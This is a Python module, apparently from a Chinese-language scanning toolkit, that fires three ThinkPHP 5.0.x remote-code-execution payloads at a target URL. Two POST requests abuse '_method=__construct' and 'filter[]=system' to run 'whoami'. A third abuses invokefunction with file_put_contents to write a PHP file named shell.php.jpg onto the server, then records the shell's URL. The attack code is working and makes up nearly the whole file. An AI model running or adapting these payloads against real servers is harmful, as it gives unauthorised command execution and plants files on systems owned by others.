#! /usr/bin/python3
# -*- encoding: utf-8 -*-
import urllib3
import requests
from libs.public.outprint import OutPrintInfo
from libs.public.reqset import ReqSet

urllib3.disable_warnings()


class ThinkRCEScan4:

    def __init__(self):
        self.proxy = None
        self.timeout = None
        self.ssl = None
        self.headers = None


    def run10(self, urls):
        try:
            url = urls + '/?s=index/index'
            data = "aaaa=whoami&_method=__construct&method=GET&filter[]=system"
            response = requests.post(url, headers=self.headers, verify=self.ssl, data=data, timeout=self.timeout,
                                     proxies=self.proxy)

            response.encoding = response.apparent_encoding
            if response.status_code == 200 and url == response.url:
                OutPrintInfo("ThinkPHP", '[b bright_red]可能存在ThinkPHP-5.0.13-RCE-POC-2 ')
                OutPrintInfo("ThinkPHP", f"{url}")
                OutPrintInfo("ThinkPHP", f"DATA:{data}\n")
                with open("./result/thinkphpRce4.txt", "a") as w:
                    w.write(f"可能存在ThinkPHP-5.0.13-RCE-POC-2 {url} --- Data {data}\n")
            else:
                pass
                # OutPrintInfo("ThinkPHP", '不存在ThinkPHP-5.0.13-RCE-POC-2')

        except Exception:
            pass
            # OutPrintInfo("ThinkPHP", '不存在ThinkPHP-5.0.13-RCE-POC-2')
    def run11(self, urls):
        try:
            url = urls + '/?s=index/index'
            data = "_method=__construct&method=GET&filter[]=system&get[]=whoami"
            response = requests.post(url, headers=self.headers, verify=self.ssl, data=data, timeout=self.timeout,
                                     proxies=self.proxy)

            response.encoding = response.apparent_encoding
            if response.status_code == 200 and url == response.url:
                OutPrintInfo("ThinkPHP", '[b bright_red]可能存在ThinkPHP-5.0.13-RCE-POC-3 ')
                OutPrintInfo("ThinkPHP", f"{url}")
                OutPrintInfo("ThinkPHP", f"DATA:{data}\n")
                with open("./result/thinkphpRce4.txt", "a") as w:
                    w.write(f"可能存在ThinkPHP-5.0.13-RCE-POC-3 {url} --- Data {data}\n")
            else:
                pass
                # OutPrintInfo("ThinkPHP", '不存在ThinkPHP-5.0.13-RCE-POC-3')

        except Exception:
            pass
            # OutPrintInfo("ThinkPHP", '不存在ThinkPHP-5.0.13-RCE-POC-3')
    def run12(self, urls):
        try:
            url = urls + '/?s=index/think\app/invokefunction&function=&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=shell.php.jpg&vars[1][]=%3C?php%20phpinfo();?3E'
            # data = "_method=__construct&method=GET&filter[]=system&get[]=whoami"
            response = requests.get(url, headers=self.headers, verify=self.ssl, timeout=self.timeout,
                                     proxies=self.proxy)


            url2 = urls + "/shell.php.jpg"
            res2 = requests.get(url2, headers=self.headers, verify=self.ssl, timeout=self.timeout,
                                 proxies=self.proxy)
            if "disable_functions" in res2.text:
                OutPrintInfo("ThinkPHP", '[b bright_red]存在ThinkPHP-5.0.14-RCE-POC-1 ')
                OutPrintInfo("ThinkPHP", f"{url}")
                OutPrintInfo("ThinkPHP", f"SHELL {url2}\n")
                with open("./result/thinkphpRce4.txt","a") as w:
                    w.write(f"存在ThinkPHP-5.0.14-RCE-POC-1 {url} --- Shell {url2}\n")
            # OutPrintInfo("ThinkPHP", f"DATA:{data}")
            else:
                pass
                # OutPrintInfo("ThinkPHP", '不存在ThinkPHP-5.0.14-RCE-POC-1')

        except Exception:
            pass
            # OutPrintInfo("ThinkPHP", '不存在ThinkPHP-5.0.14-RCE-POC-1')


    def main(self, target):
        # OutPrintInfo("ThinkPHP", '开始检测RCE...')
        url = target[0].strip('/ ')
        self.ssl = target[1]
        header = target[2]
        proxy = target[3]
        self.timeout = int(target[4])
        req = ReqSet(header=header)

        self.headers = req["header"]
        self.proxy = {"http": proxy, "https": proxy}

        self.run10(url)
        # OutPrintInfo("ThinkPHP", '开始POC-10...')
        self.run11(url)
        # OutPrintInfo("ThinkPHP", '开始POC-11...')
        self.run12(url)
